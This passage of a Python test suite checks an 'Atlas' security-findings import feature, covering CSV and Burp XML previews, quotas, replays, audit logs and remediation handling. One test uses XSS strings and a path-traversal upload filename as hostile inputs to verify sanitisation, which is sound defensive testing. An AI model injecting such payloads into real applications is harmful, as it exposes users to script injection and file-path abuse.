                assert applied.status_code == 200
                applied_payload = applied.get_json()
                assert applied_payload["counts"]["entities_created"] == 1
                assert applied_payload["counts"]["findings_created"] == 1
                assert applied_payload["counts"]["entity_links"] == 1
                assert applied_payload["counts"]["finding_occurrences"] == 1
                assert applied_payload["counts"]["project_links_added"] == 1
                assert applied_payload["counts"]["project_links_existing"] == 0
                assert applied_payload["counts"]["project_targets_created"] == 1
                assert applied_payload["counts"]["project_targets_existing"] == 0

                applied_again = client.post(
                    "/atlas/imports/apply",
                    headers={"X-Session-ID": session_id},
                    json={
                        "draft_id": preview_payload["draft_id"],
                        "row_set_digest": preview_payload["row_set_digest"],
                        "project_id": project_id,
                        "options": {"import_findings": True, "create_project_targets": True},
                    },
                )
                assert applied_again.status_code == 200
                assert applied_again.get_json()["already_applied"] is True
                assert applied_again.get_json()["batch_id"] == applied_payload["batch_id"]

                applied_again_stale_digest = client.post(
                    "/atlas/imports/apply",
                    headers={"X-Session-ID": session_id},
                    json={
                        "draft_id": preview_payload["draft_id"],
                        "row_set_digest": "stale-digest-after-apply",
                        "project_id": project_id,
                        "options": {"import_findings": True, "link_to_project": True, "create_project_targets": True},
                    },
                )
                assert applied_again_stale_digest.status_code == 200
                assert applied_again_stale_digest.get_json()["already_applied"] is True
                assert applied_again_stale_digest.get_json()["batch_id"] == applied_payload["batch_id"]

            quota_payload = (
                "row_type,entity_kind,entity_value\n"
                "entity,domain,quota-one.example\n"
                "entity,domain,quota-two.example\n"
            ).encode()
            quota_preview = client.post(
                "/atlas/imports/preview",
                data={
                    "format_id": "generic_csv",
                    "source_tool": "External CSV",
                    "import_name": "Quota check",
                    "file": (io.BytesIO(quota_payload), "quota.csv"),
                },
                headers={"X-Session-ID": session_id},
                content_type="multipart/form-data",
            )
            assert quota_preview.status_code == 200
            quota_preview_payload = quota_preview.get_json()
            with mock.patch.dict(config.CFG, {
                "max_project_links_per_project": 20,
                "max_project_entities_per_project": 1,
            }, clear=False):
                quota_rejected = client.post(
                    "/atlas/imports/apply",
                    headers={"X-Session-ID": session_id},
                    json={
                        "draft_id": quota_preview_payload["draft_id"],
                        "row_set_digest": quota_preview_payload["row_set_digest"],
                        "project_id": quota_project_id,
                        "options": {"import_entities": True, "link_to_project": True},
                    },
                )
            assert quota_rejected.status_code == 409
            assert quota_rejected.get_json()["error"] == "project_quota_exceeded"
            assert quota_rejected.get_json()["message"] == "project entity quota exceeded for this project"

            with db_connect() as conn:
                run_count = conn.execute("SELECT COUNT(*) AS count FROM runs").fetchone()["count"]
                entity_count = conn.execute("SELECT COUNT(*) AS count FROM entities").fetchone()["count"]
                finding_count = conn.execute("SELECT COUNT(*) AS count FROM findings").fetchone()["count"]
                batch_count = conn.execute("SELECT COUNT(*) AS count FROM atlas_import_batches").fetchone()["count"]
                batch_status = conn.execute("SELECT status FROM atlas_import_batches").fetchone()["status"]
                entity_link_count = conn.execute(
                    "SELECT COUNT(*) AS count FROM atlas_entity_import_links"
                ).fetchone()["count"]
                entity_link_occurrence_count = conn.execute(
                    "SELECT occurrence_count FROM atlas_entity_import_links"
                ).fetchone()["occurrence_count"]
                finding_occurrence_count = conn.execute(
                    "SELECT COUNT(*) AS count FROM atlas_finding_import_occurrences"
                ).fetchone()["count"]
                finding_identity = conn.execute(
                    "SELECT subject_key, signature_hash FROM findings"
                ).fetchone()
                project_target_count = conn.execute(
                    "SELECT COUNT(*) AS count FROM project_links WHERE project_id = ? AND entity_type = 'atlas_entity'",
                    (project_id,),
                ).fetchone()["count"]
                quota_project_link_count = conn.execute(
                    "SELECT COUNT(*) AS count FROM project_links WHERE project_id = ? AND entity_type = 'atlas_entity'",
                    (quota_project_id,),
                ).fetchone()["count"]
            assert run_count == 0
            assert entity_count == 1
            assert finding_count == 1
            assert batch_count == 1
            assert batch_status == "applied"
            assert entity_link_count == 1
            assert entity_link_occurrence_count == 3
            assert finding_occurrence_count == 1
            expected_finding_subject = entity_signature("domain", "imported.example")
            expected_finding_signature = _finding_signature(
                "generic",
                "finding",
                "high",
                _normalize_finding_signal_key("Imported TLS finding\ncertificate mismatch"),
                expected_finding_subject,
            )
            assert finding_identity["subject_key"] == expected_finding_subject
            assert finding_identity["signature_hash"] == expected_finding_signature
            assert project_target_count == 1
            assert quota_project_link_count == 0
            apply_success_extra = next(
                call.kwargs["extra"]
                for call in mock_apply_log.call_args_list
                if call.args[0] == "ATLAS_IMPORT_APPLY_SUCCEEDED"
            )
            assert apply_success_extra["session"].startswith("tok_atla")
            assert apply_success_extra["session"].endswith("********")
            assert apply_success_extra["draft_id"] == preview_payload["draft_id"]
            assert apply_success_extra["batch_id"] == applied_payload["batch_id"]
            assert apply_success_extra["project_id"] == project_id
            assert apply_success_extra["option_import_findings"] is True
            assert apply_success_extra["option_link_to_project"] is True
            assert apply_success_extra["option_create_project_targets"] is True
            assert apply_success_extra["entities_created"] == 1
            assert apply_success_extra["project_targets_created"] == 1
            apply_created_extra = next(
                call.kwargs["extra"]
                for call in mock_apply_log.call_args_list
                if call.args[0] == "ATLAS_IMPORT_APPLIED"
            )
            assert apply_created_extra["session"].startswith("tok_atla")
            assert apply_created_extra["session"].endswith("********")
            assert apply_created_extra["source_tool_key"] == "external_csv"
            assert "source_tool" not in apply_created_extra
            assert apply_created_extra["project_id"] == project_id
            assert apply_created_extra["option_link_to_project"] is True
            assert apply_created_extra["required_capabilities"] == ["mutate_projects", "triage_findings"]
            replayed_events = [
                call.kwargs["extra"]
                for call in mock_apply_log.call_args_list
                if call.args[0] == "ATLAS_IMPORT_APPLY_REPLAYED"
            ]
            assert len(replayed_events) == 2
            assert replayed_events[0]["draft_status"] == "applied"
            assert replayed_events[0]["batch_id"] == applied_payload["batch_id"]
            import_events = [
                *(call.args[0] for call in mock_import_log.call_args_list),
                *(call.args[0] for call in mock_apply_log.call_args_list),
            ]
            assert "ATLAS_IMPORT_PREVIEW_CREATED" in import_events
            assert "ATLAS_IMPORT_APPLIED" in import_events
            assert "ATLAS_IMPORT_APPLY_REPLAYED" in import_events
            audit_rows = _audit_event_rows(target_id=applied_payload["batch_id"], event_type="import.apply")
            assert [row["target_type"] for row in audit_rows] == ["import", "import", "import"]
            assert [row["project_id"] for row in audit_rows] == [project_id, project_id, project_id]
            assert [row["details"]["already_applied"] for row in audit_rows] == [False, True, True]
            assert audit_rows[0]["details"]["source"] == "atlas"
            assert audit_rows[0]["details"]["draft_id"] == preview_payload["draft_id"]
            assert audit_rows[0]["details"]["batch_id"] == applied_payload["batch_id"]
            assert audit_rows[0]["details"]["format_id"] == "generic_csv"
            assert audit_rows[0]["details"]["source_tool"] == "External CSV"
            assert audit_rows[0]["details"]["source_tool_key"] == "external_csv"
            assert audit_rows[0]["details"]["options"] == {
                "import_entities": False,
                "import_findings": True,
                "link_to_project": True,
                "create_project_targets": True,
            }
            assert audit_rows[0]["details"]["counts"]["entities_created"] == 1
            assert audit_rows[0]["details"]["counts"]["findings_created"] == 1
            assert audit_rows[0]["details"]["counts"]["project_links_added"] == 1
            assert audit_rows[0]["details"]["counts"]["project_targets_created"] == 1
            assert csv_payload.decode() not in json.dumps(audit_rows)
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_create_project_targets_only_reports_target_entity_side_effects(self, tmp_path):
        client, patchers = self._client(tmp_path)
        try:
            session_id = "tok_atlas_import_target_only"
            self._register_session_token(session_id)
            project_id = "proj_atlas_import_target_only"
            with db_connect() as conn:
                conn.execute(
                    "INSERT INTO projects (id, session_id, name, slug, created, updated) "
                    "VALUES (?, ?, 'Target Only Import', 'target-only-import', ?, ?)",
                    (project_id, session_id, datetime.now(timezone.utc).isoformat(), datetime.now(timezone.utc).isoformat()),
                )
                conn.commit()
            csv_payload = (
                "row_type,entity_kind,entity_value\n"
                "entity,domain,target-only.example\n"
            ).encode()
            preview = client.post(
                "/atlas/imports/preview",
                data={
                    "format_id": "generic_csv",
                    "source_tool": "External CSV",
                    "import_name": "Target-only triage",
                    "file": (io.BytesIO(csv_payload), "target-only.csv"),
                },
                headers={"X-Session-ID": session_id},
                content_type="multipart/form-data",
            )
            assert preview.status_code == 200
            preview_payload = preview.get_json()

            applied = client.post(
                "/atlas/imports/apply",
                headers={"X-Session-ID": session_id},
                json={
                    "draft_id": preview_payload["draft_id"],
                    "row_set_digest": preview_payload["row_set_digest"],
                    "project_id": project_id,
                    "options": {"create_project_targets": True},
                },
            )

            assert applied.status_code == 200
            counts = applied.get_json()["counts"]
            assert counts["entities_created"] == 1
            assert counts["entity_links"] == 1
            assert counts["findings_created"] == 0
            assert counts["project_links_added"] == 0
            assert counts["project_links_existing"] == 0
            assert counts["project_targets_created"] == 1
            assert counts["project_targets_existing"] == 0
            with db_connect() as conn:
                entity_count = conn.execute("SELECT COUNT(*) AS count FROM entities").fetchone()["count"]
                import_link_count = conn.execute(
                    "SELECT COUNT(*) AS count FROM atlas_entity_import_links"
                ).fetchone()["count"]
                project_link = conn.execute(
                    "SELECT source FROM project_links WHERE project_id = ?",
                    (project_id,),
                ).fetchone()
            assert entity_count == 1
            assert import_link_count == 1
            assert project_link["source"] == "auto_input_file"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_create_project_targets_quota_rejects_without_partial_import_rows(self, tmp_path):
        client, patchers = self._client(tmp_path)
        try:
            session_id = "tok_atlas_import_target_quota"
            self._register_session_token(session_id)
            project_id = "proj_atlas_import_target_quota"
            with db_connect() as conn:
                conn.execute(
                    "INSERT INTO projects (id, session_id, name, slug, created, updated) "
                    "VALUES (?, ?, 'Target Quota Import', 'target-quota-import', ?, ?)",
                    (project_id, session_id, datetime.now(timezone.utc).isoformat(), datetime.now(timezone.utc).isoformat()),
                )
                conn.commit()
            csv_payload = (
                "row_type,entity_kind,entity_value\n"
                "entity,domain,target-quota-one.example\n"
                "entity,domain,target-quota-two.example\n"
            ).encode()
            preview = client.post(
                "/atlas/imports/preview",
                data={
                    "format_id": "generic_csv",
                    "source_tool": "External CSV",
                    "import_name": "Target quota triage",
                    "file": (io.BytesIO(csv_payload), "target-quota.csv"),
                },
                headers={"X-Session-ID": session_id},
                content_type="multipart/form-data",
            )
            assert preview.status_code == 200
            preview_payload = preview.get_json()
            assert preview_payload["counts"]["project_target_candidates"] == 2

            with mock.patch.dict(config.CFG, {
                "max_project_links_per_project": 20,
                "max_project_entities_per_project": 20,
                "max_project_targets_per_project": 1,
            }, clear=False):
                rejected = client.post(
                    "/atlas/imports/apply",
                    headers={"X-Session-ID": session_id},
                    json={
                        "draft_id": preview_payload["draft_id"],
                        "row_set_digest": preview_payload["row_set_digest"],
                        "project_id": project_id,
                        "options": {"create_project_targets": True},
                    },
                )

            assert rejected.status_code == 409
            assert rejected.get_json() == {
                "error": "project_quota_exceeded",
                "message": "project target quota exceeded for this project",
            }
            with db_connect() as conn:
                draft_status = conn.execute(
                    "SELECT status FROM atlas_import_drafts WHERE id = ?",
                    (preview_payload["draft_id"],),
                ).fetchone()["status"]
                entity_count = conn.execute("SELECT COUNT(*) AS count FROM entities").fetchone()["count"]
                finding_count = conn.execute("SELECT COUNT(*) AS count FROM findings").fetchone()["count"]
                batch_count = conn.execute("SELECT COUNT(*) AS count FROM atlas_import_batches").fetchone()["count"]
                entity_link_count = conn.execute(
                    "SELECT COUNT(*) AS count FROM atlas_entity_import_links"
                ).fetchone()["count"]
                finding_occurrence_count = conn.execute(
                    "SELECT COUNT(*) AS count FROM atlas_finding_import_occurrences"
                ).fetchone()["count"]
                project_target_count = conn.execute(
                    "SELECT COUNT(*) AS count FROM project_links WHERE project_id = ? AND entity_type = 'atlas_entity'",
                    (project_id,),
                ).fetchone()["count"]
            assert draft_status == "previewed"
            assert entity_count == 0
            assert finding_count == 0
            assert batch_count == 0
            assert entity_link_count == 0
            assert finding_occurrence_count == 0
            assert project_target_count == 0
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_apply_updates_existing_scan_records_and_preserves_import_provenance(self, tmp_path):
        from services.intel.canonical import entity_signature
        from services.projects.findings import _finding_signature, _normalize_finding_signal_key

        client, patchers = self._client(tmp_path)
        try:
            session_id = "tok_atlas_import_existing_mix"
            self._register_session_token(session_id)
            run_id = "run_existing_import_mix"
            entity_id = "ent_existing_import_mix"
            finding_id = "fnd_existing_import_mix"
            canonical_value = "mixed-existing.example"
            seen_at = "2026-06-01T00:00:00+00:00"
            import_seen_at = "2026-06-02T00:00:00+00:00"
            import_later_at = "2026-06-03T00:00:00+00:00"
            subject_key = entity_signature("domain", canonical_value)
            finding_signature = _finding_signature(
                "generic",
                "finding",
                "high",
                _normalize_finding_signal_key("Existing mixed finding\nsame evidence"),
                subject_key,
            )
            with db_connect() as conn:
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started, output_preview, output_search_text) "
                    "VALUES (?, ?, 'nmap mixed-existing.example', ?, '[]', 'same evidence')",
                    (run_id, session_id, seen_at),
                )
                conn.execute(
                    "INSERT INTO entities "
                    "(id, session_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, "
                    "occurrence_count, created) "
                    "VALUES (?, ?, 'domain', ?, ?, ?, ?, 1, ?)",
                    (entity_id, session_id, canonical_value, subject_key, seen_at, seen_at, seen_at),
                )
                conn.execute(
                    "INSERT INTO entity_run_links (entity_id, run_id, first_seen_at, last_seen_at, occurrence_count) "
                    "VALUES (?, ?, ?, ?, 1)",
                    (entity_id, run_id, seen_at, seen_at),
                )
                conn.execute(
                    "INSERT INTO findings "
                    "(id, session_id, run_id, entity_id, subject_key, signature_hash, severity, kind, tool_root, "
                    "first_run_id, last_run_id, first_seen_at, last_seen_at, occurrence_count, status, title, raw_line, created) "
                    "VALUES (?, ?, ?, ?, ?, ?, 'high', 'finding', 'generic', ?, ?, ?, ?, 1, 'new', ?, ?, ?)",
                    (
                        finding_id,
                        session_id,
                        run_id,
                        entity_id,
                        subject_key,
                        finding_signature,
                        run_id,
                        run_id,
                        seen_at,
                        seen_at,
                        "Existing mixed finding",
                        "same evidence",
                        seen_at,
                    ),
                )
                conn.execute(
                    "UPDATE findings_occurrences SET line_number = 7, snippet = 'same evidence', seen_at = ? "
                    "WHERE finding_id = ? AND run_id = ?",
                    (seen_at, finding_id, run_id),
                )
                conn.commit()

            csv_payload = (
                "row_type,entity_kind,entity_value,title,severity,evidence,external_id,observed_at\n"
                f"entity,domain,MIXED-existing.example,,,,entity-1,{import_seen_at}\n"
                f"finding,domain,{canonical_value},Existing mixed finding,high,same evidence,finding-1,{import_seen_at}\n"
                f"finding,domain,MIXED-existing.example,Existing mixed finding,high,same evidence,finding-2,{import_later_at}\n"
            ).encode()
            preview = client.post(
                "/atlas/imports/preview",
                data={
                    "format_id": "generic_csv",
                    "source_tool": "External CSV",
                    "import_name": "Existing scan mix",
                    "file": (io.BytesIO(csv_payload), "existing-mix.csv"),
                },
                headers={"X-Session-ID": session_id},
                content_type="multipart/form-data",
            )
            assert preview.status_code == 200
            preview_payload = preview.get_json()
            assert preview_payload["counts"]["entity_duplicate"] == 1
            assert preview_payload["counts"]["finding_duplicate"] == 2
            assert preview_payload["counts"]["new"] == 0
            assert preview_payload["counts"]["updated"] == 3

            applied = client.post(
                "/atlas/imports/apply",
                headers={"X-Session-ID": session_id},
                json={
                    "draft_id": preview_payload["draft_id"],
                    "row_set_digest": preview_payload["row_set_digest"],
                    "options": {"import_entities": True, "import_findings": True},
                },
            )

            assert applied.status_code == 200
            counts = applied.get_json()["counts"]
            assert counts["entities_created"] == 0
            assert counts["entities_updated"] == 1
            assert counts["findings_created"] == 0
            assert counts["findings_updated"] == 2
            assert counts["entity_links"] == 1
            assert counts["finding_occurrences"] == 2
            with db_connect() as conn:
                entity_row = conn.execute(
                    "SELECT occurrence_count, first_seen_at, last_seen_at FROM entities WHERE id = ?",
                    (entity_id,),
                ).fetchone()
                finding_row = conn.execute(
                    "SELECT occurrence_count, first_run_id, last_run_id, line_number FROM findings WHERE id = ?",
                    (finding_id,),
                ).fetchone()
                entity_import_link = conn.execute(
                    "SELECT occurrence_count, created_entity, first_observed_at, last_observed_at "
                    "FROM atlas_entity_import_links WHERE entity_id = ?",
                    (entity_id,),
                ).fetchone()
                finding_import_count = conn.execute(
                    "SELECT COUNT(*) AS count FROM atlas_finding_import_occurrences WHERE finding_id = ?",
                    (finding_id,),
                ).fetchone()["count"]
            assert entity_row["occurrence_count"] == 4
            assert entity_row["first_seen_at"] == seen_at
            assert entity_row["last_seen_at"] == import_later_at
            assert finding_row["occurrence_count"] == 3
            assert finding_row["first_run_id"] == run_id
            assert finding_row["last_run_id"] == ""
            assert finding_row["line_number"] == 7
            assert entity_import_link["occurrence_count"] == 3
            assert entity_import_link["created_entity"] == 0
            assert entity_import_link["first_observed_at"] == import_seen_at
            assert entity_import_link["last_observed_at"] == import_later_at
            assert finding_import_count == 2

            listed = client.get("/atlas/findings?q=mixed", headers={"X-Session-ID": session_id})
            detail = client.get(f"/atlas/entities/{entity_id}", headers={"X-Session-ID": session_id})
            imported_triage = client.put(
                f"/findings/{finding_id}/triage",
                headers={"X-Session-ID": session_id},
                json={"verification_status": "needs_retest", "verification_steps": "Re-run imported proof."},
            )

            assert listed.status_code == 200
            listed_finding = listed.get_json()["findings"][0]
            assert listed_finding["id"] == finding_id
            assert listed_finding["import_sources"][0]["import_name"] == "Existing scan mix"
            assert listed_finding["import_sources"][0]["occurrence_count"] == 2
            assert imported_triage.status_code == 200
            assert imported_triage.get_json()["triage"]["verification_status"] == "needs_retest"
            assert detail.status_code == 200
            detail_payload = detail.get_json()
            assert detail_payload["import_sources"][0]["created_record"] is False
            assert detail_payload["import_sources"][0]["occurrence_count"] == 3
            assert detail_payload["findings"][0]["import_sources"][0]["occurrence_count"] == 2
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_import_routes_keep_uploaded_filename_and_text_fields_as_safe_json_data(self, tmp_path):
        client, patchers = self._client(tmp_path)
        try:
            session_id = "tok_atlas_import_untrusted_text"
            self._register_session_token(session_id)
            title = '<script>alert("atlas")</script> TLS finding'
            evidence = '<img src=x onerror=alert(1)> evidence & notes'
            csv_body = io.StringIO()
            writer = csv.DictWriter(
                csv_body,
                fieldnames=["row_type", "entity_kind", "entity_value", "title", "severity", "evidence", "external_id"],
            )
            writer.writeheader()
            writer.writerow({
                "row_type": "finding",
                "entity_kind": "domain",
                "entity_value": "unsafe-text.example",
                "title": title,
                "severity": "medium",
                "evidence": evidence,
                "external_id": "unsafe-text-1",
            })

            preview = client.post(
                "/atlas/imports/preview",
                data={
                    "format_id": "generic_csv",
                    "source_tool": "External CSV",
                    "import_name": "Unsafe text import",
                    "file": (io.BytesIO(csv_body.getvalue().encode()), "../../triage<script>.csv"),
                },
                headers={"X-Session-ID": session_id},
                content_type="multipart/form-data",
            )

            assert preview.status_code == 200
            assert "application/json" in preview.content_type
            preview_payload = preview.get_json()
            assert preview_payload["samples"]["findings"][0]["title"] == title

            applied = client.post(
                "/atlas/imports/apply",
                headers={"X-Session-ID": session_id},
                json={
                    "draft_id": preview_payload["draft_id"],
                    "row_set_digest": preview_payload["row_set_digest"],
                    "options": {"import_entities": True, "import_findings": True},
                },
            )

            assert applied.status_code == 200
            with db_connect() as conn:
                draft_row = conn.execute(
                    "SELECT filename FROM atlas_import_drafts WHERE id = ?",
                    (preview_payload["draft_id"],),
                ).fetchone()
                batch_row = conn.execute(
                    "SELECT filename FROM atlas_import_batches WHERE draft_id = ?",
                    (preview_payload["draft_id"],),
                ).fetchone()
            assert draft_row["filename"] == "triage_script_.csv"
            assert batch_row["filename"] == "triage_script_.csv"
            assert "/" not in draft_row["filename"]
            assert "\\" not in draft_row["filename"]
            assert "<" not in draft_row["filename"]
            assert ">" not in draft_row["filename"]

            listed = client.get("/atlas/findings?q=TLS", headers={"X-Session-ID": session_id})
            assert listed.status_code == 200
            assert "application/json" in listed.content_type
            listed_finding = listed.get_json()["findings"][0]
            assert listed_finding["title"] == title
            assert listed_finding["raw_line"] == evidence
            assert listed_finding["import_sources"][0]["filename"] == "triage_script_.csv"

            detail = client.get(f"/atlas/entities/{listed_finding['entity_id']}", headers={"X-Session-ID": session_id})
            assert detail.status_code == 200
            assert "application/json" in detail.content_type
            detail_payload = detail.get_json()
            assert detail_payload["import_sources"][0]["filename"] == "triage_script_.csv"
            assert detail_payload["findings"][0]["title"] == title
            assert detail_payload["findings"][0]["raw_line"] == evidence
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_reimport_preserves_operator_edited_remediation(self, tmp_path):
        client, patchers = self._client(tmp_path)
        try:
            session_id = "tok_atlas_import_remediation"
            self._register_session_token(session_id)

            def burp_payload(remediation):
                return f"""
                <issues burpVersion="2026.1">
                  <issue>
                    <serialNumber>42</serialNumber>
                    <type>5242880</type>
                    <name>SQL injection</name>
                    <host>https://darklab.sh</host>
                    <path>/search?q=test</path>
                    <severity>High</severity>
                    <confidence>Firm</confidence>
                    <issueDetail>Parameter q appears injectable.</issueDetail>
                    <remediationDetail>{remediation}</remediationDetail>
                    <requestresponse>
                      <request method="GET" base64="false">GET /search?q=test HTTP/1.1
Host: darklab.sh</request>
                      <response base64="false">HTTP/1.1 500 Internal Server Error
SQL syntax error near q</response>
                    </requestresponse>
                  </issue>
                </issues>
                """.encode()

            def preview_and_apply(payload, name):
                preview = client.post(
                    "/atlas/imports/preview",
                    data={
                        "format_id": "burp_xml",
                        "source_tool": "Burp Suite",
                        "import_name": name,
                        "file": (io.BytesIO(payload), f"{name}.xml"),
                    },
                    headers={"X-Session-ID": session_id},
                    content_type="multipart/form-data",
                )
                assert preview.status_code == 200
                preview_payload = preview.get_json()
                applied = client.post(
                    "/atlas/imports/apply",
                    headers={"X-Session-ID": session_id},
                    json={
                        "draft_id": preview_payload["draft_id"],
                        "row_set_digest": preview_payload["row_set_digest"],
                        "options": {"import_entities": True, "import_findings": True},
                    },
                )
                assert applied.status_code == 200
                return applied.get_json()

            with mock.patch.object(atlas_import_workflow.log, "debug") as remediation_debug, \
                 mock.patch.object(atlas_import_workflow.log, "info") as remediation_info:
                first_apply = preview_and_apply(
                    burp_payload("Use parameterized queries."),
                    "burp-remediation-first",
                )
            listed = client.get("/atlas/findings?q=SQL", headers={"X-Session-ID": session_id})
            assert listed.status_code == 200
            finding_id = listed.get_json()["findings"][0]["id"]
            imported_triage = client.get(
                f"/findings/{finding_id}/triage",
                headers={"X-Session-ID": session_id},
            )
            assert imported_triage.status_code == 200
            assert imported_triage.get_json()["triage"]["remediation"] == "Use parameterized queries."

            operator_triage = client.put(
                f"/findings/{finding_id}/triage",
                headers={"X-Session-ID": session_id},
                json={
                    "remediation": "Use the platform query builder and add regression coverage.",
                    "verification_steps": "Re-run Burp active scan.",
                    "verification_status": "ready_to_verify",
                },
            )
            assert operator_triage.status_code == 200

            with mock.patch.object(atlas_import_workflow.log, "warning") as remediation_warning:
                second_apply = preview_and_apply(
                    burp_payload("Upgrade the scanner-recommended parameterization wording."),
                    "burp-remediation-second",
                )
            preserved_triage = client.get(
                f"/findings/{finding_id}/triage",
                headers={"X-Session-ID": session_id},
            )

            assert first_apply["counts"]["findings_created"] == 1
            assert first_apply["counts"]["finding_remediations_imported"] == 1
            remediation_debug.assert_any_call("ATLAS_IMPORT_REMEDIATION_TRIAGE_UPSERT", extra=mock.ANY)
            remediation_debug_extra = next(
                call.kwargs["extra"]
                for call in remediation_debug.call_args_list
                if call.args and call.args[0] == "ATLAS_IMPORT_REMEDIATION_TRIAGE_UPSERT"
            )
            assert remediation_debug_extra["finding_id"] == finding_id
            assert remediation_debug_extra["created_finding"] is True
            assert remediation_debug_extra["existing_triage"] is False
            assert remediation_debug_extra["remediation_chars"] == len("Use parameterized queries.")
            remediation_info_extra = next(
                call.kwargs["extra"]
                for call in remediation_info.call_args_list
                if call.args and call.args[0] == "ATLAS_IMPORT_APPLIED"
            )
            assert remediation_info_extra["finding_remediations_imported"] == 1
            assert second_apply["counts"]["findings_updated"] == 1
            assert second_apply["counts"]["finding_remediations_imported"] == 0
            remediation_warning.assert_any_call(
                "ATLAS_IMPORT_REMEDIATION_PRESERVED_EXISTING_TRIAGE",
                extra=mock.ANY,
            )
            remediation_warning_extra = next(
                call.kwargs["extra"]
                for call in remediation_warning.call_args_list
                if call.args and call.args[0] == "ATLAS_IMPORT_REMEDIATION_PRESERVED_EXISTING_TRIAGE"
            )
            assert remediation_warning_extra["finding_id"] == finding_id
            assert remediation_warning_extra["previous_remediation_chars"] == len(
                "Use the platform query builder and add regression coverage."
            )
            assert remediation_warning_extra["imported_remediation_chars"] == len(
                "Upgrade the scanner-recommended parameterization wording."
            )
            assert preserved_triage.status_code == 200
            triage = preserved_triage.get_json()["triage"]
            assert triage["remediation"] == "Use the platform query builder and add regression coverage."
            assert triage["verification_steps"] == "Re-run Burp active scan."
            assert triage["verification_status"] == "ready_to_verify"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_apply_rejects_digest_mismatch_and_stale_or_invalid_previews(self, tmp_path):
        client, patchers = self._client(tmp_path)
        try:
            session_id = "tok_atlas_import_digest"
            self._register_session_token(session_id)
            with mock.patch("blueprints.atlas.preview_atlas_import", return_value={"ok": True}) as mock_preview:
                streamed_preview = client.post(
                    "/atlas/imports/preview",
                    data={
                        "format_id": "generic_csv",
                        "source_tool": "External CSV",
                        "import_name": "Stream check",
                        "file": (
                            io.BytesIO(b"row_type,entity_kind,entity_value\nentity,domain,stream.example\n"),
                            "stream.csv",
                        ),
                    },
                    headers={"X-Session-ID": session_id},
                    content_type="multipart/form-data",
                )
            assert streamed_preview.status_code == 200
            streamed_content = mock_preview.call_args.kwargs["file_content"]
            assert not isinstance(streamed_content, (bytes, str))
            assert hasattr(streamed_content, "read")

            with mock.patch.dict(config.CFG, {"atlas_import_max_upload_mb": 1}, clear=False), \
                    mock.patch("blueprints.atlas.preview_atlas_import") as mock_preview, \
                    mock.patch("blueprints.atlas.log.warning") as mock_preview_warning:
                declared_oversized = client.post(
                    "/atlas/imports/preview",
                    data={},
                    headers={"X-Session-ID": session_id},
                    content_type="multipart/form-data",
                    environ_overrides={"CONTENT_LENGTH": str(3 * 1024 * 1024)},
                )
            assert declared_oversized.status_code == 413
            assert declared_oversized.get_json()["error"] == "invalid_import_file"
            assert "byte limit" in declared_oversized.get_json()["message"]
            mock_preview.assert_not_called()
            oversized_warning = mock_preview_warning.call_args
            assert oversized_warning.args[0] == "ATLAS_IMPORT_PREVIEW_REJECTED"
            assert oversized_warning.kwargs["extra"]["reason"] == "request_too_large"
            assert oversized_warning.kwargs["extra"]["session"].startswith("tok_atla")
            assert oversized_warning.kwargs["extra"]["session"].endswith("********")
            assert oversized_warning.kwargs["extra"]["status"] == 413

            with mock.patch.object(atlas_import_workflow.log, "warning") as mock_import_warning:
                unsupported = client.post(
                    "/atlas/imports/preview",
                    data={
                        "format_id": "content_sniff_me",
                        "source_tool": "External CSV",
                        "import_name": "Unsupported format",
                        "file": (
                            io.BytesIO(b"row_type,entity_kind,entity_value\nentity,domain,unsupported.example\n"),
                            "triage.csv",
                        ),
                    },
                    headers={"X-Session-ID": session_id},
                    content_type="multipart/form-data",
                )
            assert unsupported.status_code == 400
            assert unsupported.get_json()["error"] == "invalid_import_file"
            warning_events = [call.args[0] for call in mock_import_warning.call_args_list]
            assert "ATLAS_IMPORT_PREVIEW_REJECTED" in warning_events
            preview_rejected_extra = next(
                call.kwargs["extra"]
                for call in mock_import_warning.call_args_list
                if call.args[0] == "ATLAS_IMPORT_PREVIEW_REJECTED"
                and "session" in call.kwargs["extra"]
            )
            assert preview_rejected_extra["reason"] == "invalid_import_file"
            assert preview_rejected_extra["session"].startswith("tok_atla")
            assert preview_rejected_extra["session"].endswith("********")
            assert preview_rejected_extra["format_id"] == "content_sniff_me"
            assert preview_rejected_extra["source_tool_key"] == "external_csv"
            assert preview_rejected_extra["status"] == 400

            with mock.patch.dict(config.CFG, {"atlas_import_max_upload_mb": 1}, clear=False):
                oversized = client.post(
                    "/atlas/imports/preview",
                    data={
                        "format_id": "generic_csv",
                        "source_tool": "External CSV",
                        "import_name": "Too large",
                        "file": (
                            io.BytesIO(b"x" * (1024 * 1024 + 1)),
                            "too-large.csv",
                        ),
                    },
                    headers={"X-Session-ID": session_id},
                    content_type="multipart/form-data",
                )
            assert oversized.status_code == 400
            assert oversized.get_json()["error"] == "invalid_import_file"
            assert "byte limit" in oversized.get_json()["message"]

            expired_preview = client.post(
                "/atlas/imports/preview",
                data={
                    "format_id": "generic_csv",
                    "source_tool": "External CSV",
                    "import_name": "Expired draft",
                    "file": (
                        io.BytesIO(b"row_type,entity_kind,entity_value\nentity,domain,expired.example\n"),
                        "expired.csv",
                    ),
                },
                headers={"X-Session-ID": session_id},
                content_type="multipart/form-data",
            )
            assert expired_preview.status_code == 200
            expired_draft_id = expired_preview.get_json()["draft_id"]
            with db_connect() as conn:
                conn.execute(
                    "UPDATE atlas_import_drafts SET expires_at = '2000-01-01 00:00:00' WHERE id = ?",
                    (expired_draft_id,),
                )
                conn.commit()

            with mock.patch("blueprints.atlas.log.warning") as mock_apply_warning:
                stale_apply = client.post(
                    "/atlas/imports/apply",
                    headers={"X-Session-ID": session_id},
                    json={
                        "draft_id": expired_draft_id,
                        "row_set_digest": expired_preview.get_json()["row_set_digest"],
                        "options": {"import_entities": True},
                    },
                )
            assert stale_apply.status_code == 400
            assert stale_apply.get_json()["error"] == "draft_expired"
            stale_warning = mock_apply_warning.call_args
            assert stale_warning.args[0] == "ATLAS_IMPORT_APPLY_REJECTED"
            assert stale_warning.kwargs["extra"]["reason"] == "draft_expired"
            assert stale_warning.kwargs["extra"]["draft_id"] == expired_draft_id
            assert stale_warning.kwargs["extra"]["import_entities"] is True
            service_stale_warning = next(
